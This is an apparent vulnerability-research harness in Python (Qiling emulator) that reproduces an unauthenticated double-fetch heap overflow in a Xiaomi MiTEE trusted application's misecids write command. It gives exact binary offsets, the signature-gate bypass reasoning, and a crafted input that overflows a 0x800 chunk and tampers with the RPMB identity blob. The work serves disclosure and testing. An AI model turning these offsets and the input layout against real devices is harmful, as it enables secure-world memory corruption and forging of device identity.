#from params import *
from .params import *
from . import asan
from pwn import *
from qiling import Qiling
import struct, os

# ============================================================================
# S26-1  --  idmanager  (8aaaf201-2460-0000-aabbccdd00000006)  cmd 0x002
#   cmd_write_misecids : UNAUTHENTICATED double-fetch -> ~6 KB heap overflow
#                        (+ persistent RPMB identity-blob tamper)
#
# Deterministic in-emulator reproduction of the input-side double-fetch filed as
# S26-1 (docs/submissions/S26_xiaomi_mitee_double_fetch.md ; docs/bugs/xiaomi_s26-1.md ;
# RE/triage/mitee_double_fetch_manual.md DF-1). Driven on the SHIPPED klee build
# (the staged .ta is sha256 47d81e49...  == the binary the writeup offsets come from).
#
# ---- THE BUG (disasm-confirmed on this exact .ta) -------------------------------
#   dispatcher TA_InvokeCommandEntryPoint @0x20098 gates ONLY:
#       paramTypes == 0x65          (p0 = MEMREF_INPUT, p1 = MEMREF_OUTPUT)
#       params[0].size == 0x2008  &  params[1].size == 0x2008
#       *(u32*)p0.buf == 1          (protocol version)
#     -> NO auth: do_auth_token_check is called only for cmd 0x103 / 0x105.
#   handler cmd_write_misecids @0x20458 reads the inner length [p0.buf+4] TWICE
#   straight from the still-shared input MEMREF VMO, with NO copy-in between:
#       read#1 @0x2046c   ldr w8,[x0,#4]    -> len1 ; gates ecc_verify over (len1-64) B
#       read#2 @0x204f0   ldr w1,[x20,#4]   -> len2 ; passed to secure_id_write @0x21fa0
#                          secure_id_write: xiaomi_malloc(0x800)               (2048-B chunk)
#                                           memmove(chunk, p0.buf+8, len2) @0x22014   <-- OVERFLOW
#                                           rpmb_write(slot0, chunk, 0x800)   (persist)
#   len2 is UNCLAMPED (bounded only by p0.size = 0x2008). A normal-world thread that
#   flips [p0.buf+4] from a small len1 (so the signature covers a tiny prefix and the
#   gate passes) to a large len2 between the two reads overflows the 2048-B heap chunk
#   with ~6 KB of attacker content -- and persists bytes that lie BEYOND the signed
#   (len1-64) region into the misecids RPMB identity/attestation blob.
#
# ---- HOW THIS HARNESS MODELS IT (deterministic; no probabilistic race) ----------
#   The perfectly-timed normal-world writer is modelled by serving the SAME field two
#   different values across its two reads, keyed on the *reading PC*:
#       at read#1 (PC 0x2046c)  [p0+4] reads len1 = LEN1 (small, the "signed prefix")
#       at read#2 (PC 0x204f0)  [p0+4] reads len2 = LEN2 (large -> heap overflow)
#   This is exactly the value a concurrent REE writer interposes; it is how the
#   TA_GP_emulator demonstrates a double-fetch in general (cf. params.py
#   TAEMU_DOUBLE_FETCH and pocs/377e_double_fetch_stackov).
#
#   Two code hooks make the gated sink reachable & observable in the emulator:
#     (a) ecc_verify @0x21088  -> return 0.  The provisioned ECDSA-P256 pubkey is not
#         in our corpus and the signature is not forgeable; per the writeup the attacker
#         clears this gate by REPLAYING THEIR OWN DEVICE's legitimately-signed misecids
#         prefix. We model that already-cleared gate -- the bug is the length
#         decoupling, NOT a signature forgery. (Without it the run halts inside the
#         real verify over attacker bytes / an empty-RPMB pubkey.)
#     (b) xiaomi_malloc @0x214f0 -> a redzoned heap chunk with the same asan bookkeeping
#         as the emulator's own malloc, so the over-long memmove trips the asan
#         out-of-bound-write detector exactly at chunk+0x800 instead of silently
#         smashing adjacent heap.
#
#   Corpus caveat (honest; see S26 writeup section 3): MiTEE maps the input MEMREF
#   read-only in place via map_shm_buffer_internal with NO copy-in, and sibling TAs
#   defensively whole-message copy-in -- both consistent with a REE-mutable VMO -- but
#   the MiTEE TA-manager that would *prove* the REE keeps concurrent write access is
#   not in the corpus. This harness reproduces the in-TA double-fetch primitive given
#   that (standard GP shared-memory) threat model.
#
# ---- RUN ------------------------------------------------------------------------
#   (inside the ta_emu docker, cwd /srv/emulator)
#     ./fuzz.sh ../mitee/harness/idmanager_double_fetch \
#               ../mitee/harness/idmanager_double_fetch/in/seed_s26_1
#   Expect: the memmove(len=0x2000) into the 0x800 chunk -> asan
#     "[...] out-of-bound write on address 0x... , size 0x...!!"  (CRASH_PC).
#   Override the two fetched lengths with S26_LEN1 / S26_LEN2 env vars.
# ============================================================================

UUID    = "8aaaf201-2460-0000-aabbccdd00000006"
CMD     = 0x002
PTYPES  = 0x65          # p0 = MEMREF_INPUT(5), p1 = MEMREF_OUTPUT(6)
INSZ    = 0x2008        # dispatcher hard-requires both memref sizes == 0x2008
OUTSZ   = 0x2008

# inner length field [p0.buf+4]: len1 at the gate read, len2 at the use read.
LEN1 = int(os.environ.get("S26_LEN1", str(0x80)),   0) & 0xFFFFFFFF   # signs a tiny prefix
LEN2 = int(os.environ.get("S26_LEN2", str(0x2000)), 0) & 0xFFFFFFFF   # overflows malloc(0x800)

# TA offsets (PIE: file-offset == vaddr; runtime = ta_base + off). All disasm-confirmed
# on the staged .ta (sha 47d81e49...):
OFF_READ1         = 0x2046c   # ldr w8,[x0,#4]    read#1 (gate)
OFF_READ2         = 0x204f0   # ldr w1,[x20,#4]   read#2 (use)
OFF_ECC_VERIFY    = 0x21088   # ecc_verify() entry      -> stub to success
OFF_XIAOMI_MALLOC = 0x214f0   # xiaomi_malloc() entry    -> redzoned chunk
OFF_MEMMOVE_CALL  = 0x22014   # bl memmove(chunk, p0.buf+8, len2)  (the overflow)

_S = {"base": 0, "p0": 0}


# ---- code hooks (installed once in init_fuzz) -----------------------------------
def _hook_ecc_verify(ql, *a):
    # model the cleared signature gate (attacker replays own device's signed prefix)
    ql.arch.regs.x0 = 0
    ql.arch.regs.arch_pc = ql.arch.regs.lr
    print("[S26-1] ecc_verify() -> 0  (signature gate modelled as cleared)")


def _hook_xiaomi_malloc(ql, *a):
    # allocate a redzoned chunk (mirror gp.utils.string.malloc_core) so the over-copy
    # is caught by asan at chunk+size instead of silently corrupting adjacent heap.
    emu = ql.emu
    n = ql.arch.regs.x0
    real = asan.memory_alignment_round_up(n + 2 * asan.ASAN_REDZONE_SIZE, 0x1000)
    out = ql.mem.map_anywhere(real, minaddr=0x70000000, perms=3, info="xiaomi_malloc_chunk")
    user = out + asan.ASAN_REDZONE_SIZE
    emu.HEAP["allocated"][user] = n
    emu.HEAP["freed"].pop(user, None)
    asan.asan_hook_redzone_mem_rw(out, asan.ASAN_REDZONE_SIZE, ql)
    emu.HEAP["redzones"][out] = asan.ASAN_REDZONE_SIZE
    after = user + n
    after_sz = real - asan.ASAN_REDZONE_SIZE - n
    asan.asan_hook_redzone_mem_rw(after, after_sz, ql)
    emu.HEAP["redzones"][after] = after_sz
    ql.arch.regs.x0 = user
    ql.arch.regs.arch_pc = ql.arch.regs.lr
    print(f"[S26-1] xiaomi_malloc({n:#x}) -> {user:#x}  (redzoned; write past +{n:#x} trips asan)")


def _hook_memmove_call(ql, *a):
    # observe the decoupled length the instant the TA hands it to memmove
    dest, src, n = ql.arch.regs.x0, ql.arch.regs.x1, ql.arch.regs.x2
    print(f"[S26-1] >>> memmove(dest={dest:#x}, src={src:#x}, len={n:#x}) into a 0x800 "
          f"chunk  (len2={LEN2:#x} >> 0x800  =>  HEAP OVERFLOW)")


def init_fuzz(emu, sid):
    base = emu.ta_base
    _S["base"] = base
    ql = emu.ql
    ql.hook_address(_hook_ecc_verify,    base + OFF_ECC_VERIFY)
    ql.hook_address(_hook_xiaomi_malloc, base + OFF_XIAOMI_MALLOC)
    ql.hook_address(_hook_memmove_call,  base + OFF_MEMMOVE_CALL)
    print(f"[S26-1] ta_base={base:#x}  hooks: ecc_verify@{base+OFF_ECC_VERIFY:#x} "
          f"xiaomi_malloc@{base+OFF_XIAOMI_MALLOC:#x} memmove@{base+OFF_MEMMOVE_CALL:#x}")


# ---- the double-fetch: flip [p0.buf+4] between the two reads, keyed on reading PC --
def _hook_double_fetch(ql, access, address, size, value, ud=None):
    if ql.arch.regs.arch_pc == _S["base"] + OFF_READ2:
        # read#2 site: interpose the large length so THIS fetch returns len2.
        ql.mem.write(_S["p0"] + 4, struct.pack("<I", LEN2))
        print(f"[S26-1] read#2 @0x204f0: interposing len2={LEN2:#x} (gate saw len1={LEN1:#x})")


def place_input_callback(ql: Qiling, input: bytes, _: int):
    emu = ql.emu
    # well-formed misecids-write envelope -----------------------------------------
    buf  = struct.pack("<I", 1)        # [0]  protocol version == 1     (dispatcher gate)
    buf += struct.pack("<I", LEN1)     # [4]  inner length  (read twice = the double-fetch)
    buf += b"\x41" * (INSZ - 8)        # [8:] misecids payload (attacker bytes; memmove src)
    buf  = buf[:INSZ].ljust(INSZ, b"\x00")

    before = len(emu.REE_REGIONS)
    command_params = [
        MemRefParam(buf, INSZ),            # param0 MEMREF_INPUT  (the shared VMO)
        MemRefParam(bytes(OUTSZ), OUTSZ),  # param1 MEMREF_OUTPUT
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, CMD, PTYPES, command_params)

    # guest address of the param0 buffer just mapped (params.py appends it to REE_REGIONS)
    p0_base = emu.REE_REGIONS[before][0]
    _S["p0"] = p0_base
    ql.hook_mem_read(_hook_double_fetch, begin=p0_base + 4, end=p0_base + 7)
    print(f"[S26-1] cmd=0x002 paramTypes=0x65  p0={p0_base:#x}  len1={LEN1:#x} len2={LEN2:#x} "
          f"(double-fetch on [p0+4]@{p0_base+4:#x})")
    return True
